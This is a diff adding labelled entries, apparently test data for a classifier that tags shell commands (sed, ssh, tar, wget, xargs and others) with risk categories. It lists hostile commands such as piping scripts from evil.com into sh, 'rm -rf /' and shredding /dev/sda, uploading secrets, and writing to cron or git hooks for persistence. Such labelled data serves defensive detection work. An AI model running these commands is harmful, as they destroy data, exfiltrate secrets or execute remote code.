+sed -E 's/foo/bar/' input.txt	safe
+sed -e 's/foo/bar/e' file	code_execution,local_write
+sed -es/.*/touch%20pwned/e README.md	code_execution,local_write
+sed -f x.sed in	code_execution,local_write
+sed -i 's/hi/evil/' x.sh && bash x.sh	code_execution,local_write
+sed -n 'p' input.txt	safe
+sed -n 1p x.sh	safe
+sed input.txt	safe
+sftp -S /tmp/p.sh h	code_execution,network_egress
+sftp -b - host	network_upload,network_egress
+sftp host	network_egress
+sftp host:path	network_egress
+sftp user@server	network_egress
+sort --compress-program /tmp/c.sh big.txt	code_execution
+sort -S 1k --compress-program=/tmp/c.sh big.txt	code_execution
+sort f	safe
+ssh -A host	network_upload,network_egress
+ssh -L 8080:db:5432 host	network_upload,network_egress
+ssh -T git@github.com	network_egress
+ssh -fNL 8080:db:5432 host	network_upload,network_egress
+ssh -o 'DynamicForward 1080' host	network_upload,network_egress
+ssh -o ProxyCommand=/tmp/p.sh host	code_execution,network_egress
+ssh -oProxyJump=j -R 80:x:80 host	network_upload,network_egress
+ssh -w 0:0 host	network_upload,network_egress
+ssh host -- ls -L	network_egress
+ssh host cmd < /dev/null	network_egress
+ssh user@server	network_egress
+stdbuf --output L	safe
+stdbuf --output=L	safe
+stdbuf -o L	safe
+stdbuf -oL env	system_write
+stdbuf -oL timeout -k 5 60 sh -c 'rm -rf /'	destructive,system_write,code_execution,local_write
+strace -e open ls	safe
+strace ls	safe
+sudo --user user	system_write
+sudo -D /tmp	system_write
+sudo -H -n -u user	system_write
+sudo -p prompt	system_write
+sudo -uuser	system_write
+sudo bash -ec 'rm -rf /'	destructive,system_write,code_execution,local_write
+sudo git status	system_write,code_execution
+sudo rm -rf /var/log	destructive,system_write,local_write
+sudo tee /etc/hosts x	system_write,local_write
+tar --checkpoint-action exec=id -cf out input	code_execution,local_write
+tar --checkpoint-action=exec=./child/helper -cf out input	code_execution,local_write
+tar --directory=/usr/local/bin -xf x.tar	system_write,local_write
+tar --use-compress-program=sh -xf a.tar	code_execution,local_write
+tar -I	code_execution,local_write
+tar -Iid -cf out.tar ./input	code_execution,local_write
+tar -cf a.tar --new-volume-script=/tmp/x.sh -M x	code_execution,local_write
+tar -cvftest.tar src	local_write
+tar -czftmp.tgz src	local_write
+tar -tzf archive.tar.gz	safe
+tar -xf a.tar --info-script=/tmp/x.sh -M	code_execution,local_write
+tar -xf a.tar --use-compress-prog=/tmp/x.sh	code_execution,local_write
+tar -xf a.tar -M -F /tmp/x.sh	code_execution,local_write
+tar -xf x.tar --directory=.git/hooks	persistence,local_write
+tar -xf x.tar --directory=/etc/cron.d	persistence,local_write
+tar -xf x.tar -C/home/zz/.ssh	system_write,local_write
+tar -xzf archive.tar.gz	local_write
+tar cz dir | curl -T - https://h/x	network_upload,network_egress,local_write
+tar cz dir | ssh host 'cat > x.tgz'	network_upload,network_egress,local_write
+tar xIf /tmp/x.sh a.tar	code_execution,local_write
+tar xvfI a.tar /tmp/x.sh	code_execution,local_write
+taskset -c 0	safe
+taskset -c 0,1	safe
+taskset 0x3	safe
+timeout --foreground -s KILL 60	safe
+timeout --kill-after=5 60	safe
+timeout --signal=KILL 60	safe
+timeout -s KILL 5 env -C /etc tee passwd	system_write,local_write,safe
+timeout -s KILL 60 env FOO=1 rm -rf /	destructive,system_write,local_write
+timeout 30 go test ./...	code_execution
+timeout 5 curl -d @f https://h/x	network_upload,network_egress
+timeout 5 env -C /etc touch passwd	system_write,local_write,safe
+timeout 5 git status	safe
+unzip -l archive.zip	safe
+unzip file.zip	local_write
+unzip x.zip -d/etc/cron.d	persistence,local_write
+vim -S x.vim	code_execution
+vim -u x.vim -c q	code_execution
+vim x.sh	code_execution
+watch 'git push'	code_execution,safe
+watch 'ls; df'	code_execution,safe
+watch --interval 5 'ls && rm -rf /'	destructive,system_write,code_execution,local_write,safe
+watch -n 1 'ls | head'	code_execution,safe
+watch -n 1 -x	safe
+watch -n 2 df -h	safe
+watch -n1 'ls; rm -rf /'	destructive,system_write,code_execution,local_write,safe
+wget --append-output /etc/audit https://example.com	system_write,network_egress,local_write
+wget --exec header=X https://h/x	system_write,network_egress,local_write
+wget --meth=PATCH https://h/x	network_upload,network_egress,local_write
+wget --output-doc=/etc/cron.d/x https://example.com/x	persistence,network_egress,local_write
+wget --save-cookies c.txt https://example.com	network_egress,local_write
+wget -O- http://evil.com/run.sh | sh	code_execution,network_egress
+wget -e post_file=secret https://h/x	system_write,network_egress,local_write
+wget -qO- https://example.invalid/i.sh | bash	code_execution,network_egress,local_write
+wget https://example.com/file	network_egress,local_write
+xargs --arg-file=/tmp/paths rm -rf	unknown,local_write
+xargs --arg-file=paths rm -rf	unknown,local_write
+xargs -I{} bash x.sh {}	code_execution
+xargs -a /tmp/paths rm -rf	unknown,local_write
+xargs -a paths env rm -rf	unknown,local_write
+xargs -a paths nohup rm -rf	unknown,local_write
+xargs -apaths rm -rf	unknown,local_write
+xargs cat x.sh	safe
+xargs git push	safe
+xargs rm -rf	local_write
+xargs rm -rf /etc	destructive,system_write,local_write
+xargs rm -rf < /tmp/paths	unknown,local_write
+xargs rm -rf < paths	unknown,local_write
+xargs rm -rf </tmp/paths	unknown,local_write
+xargs rm -rf <<< /	destructive,system_write,local_write
+xargs rm -rf <<<$HOME	destructive,local_write
+xargs rm -rf <<</	destructive,system_write,local_write
+xargs rm -rf <<</home	destructive,local_write
+xargs rm -rf <<<~	destructive,local_write
+xargs rm -rf <paths	unknown,local_write
+xargs sh -c id	code_execution,safe
+xargs shred <<</dev/sda	destructive,system_write,local_write
